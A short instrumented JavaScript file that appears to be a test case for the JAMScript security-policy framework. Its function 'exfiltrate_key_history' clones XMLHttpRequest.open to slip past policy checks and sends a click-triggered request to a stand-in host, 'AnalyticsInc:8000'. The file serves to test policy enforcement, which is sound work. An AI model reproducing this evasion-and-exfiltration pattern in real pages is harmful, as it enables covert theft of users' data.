function copy(obj$$16) {
  var v12 = typeof obj$$16;
  var v9 = v12 !== "object";
  if(v9) {
    return obj$$16
  }else {
    var value$$29 = obj$$16.valueOf();
    var v8 = obj$$16 != value$$29;
    if(v8) {
      var v0 = obj$$16.constructor;
      return JAMScript.new(v0, [value$$29])
    }else {
      var v18 = obj$$16.constructor;
      var v13 = obj$$16 instanceof v18;
      if(v13) {
        var v19 = obj$$16.constructor;
        v13 = v19 !== Object
      }
      var v7 = v13;
      if(v7) {
        var v14 = obj$$16.constructor;
        var v1 = v14.prototype;
        var c = clone(v1);
        var property$$3;
        for(property$$3 in obj$$16) {
          var v4 = obj$$16.hasOwnProperty(property$$3);
          if(v4) {
            var v2 = c;
            var v3 = property$$3;
            introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
              var v15 = obj$$16[property$$3]
            }
            var v20 = copy(v15);
            JAMScript.set(v2, v3, v20)
          }
        }
      }else {
        c = {};
        for(property$$3 in obj$$16) {
          var v5 = c;
          var v6 = property$$3;
          introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
            var v16 = obj$$16[property$$3]
          }
          var v21 = copy(v16);
          JAMScript.set(v5, v6, v21)
        }
      }
      return c
    }
  }
  return
}
function Clone() {
  return
}
function clone(obj$$17) {
  Clone.prototype = obj$$17;
  return new Clone
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v10 = xmlhttp;
  introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
    var v17 = xmlhttp.open
  }
  var v22 = copy(v17);
  v10.opennew = v22;
  JAMScript.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true]);
  xmlhttp.send(null);
  return
}
var v11 = document.getElementById("test");
JAMScript.set(v11, "onclick", exfiltrate_key_history);

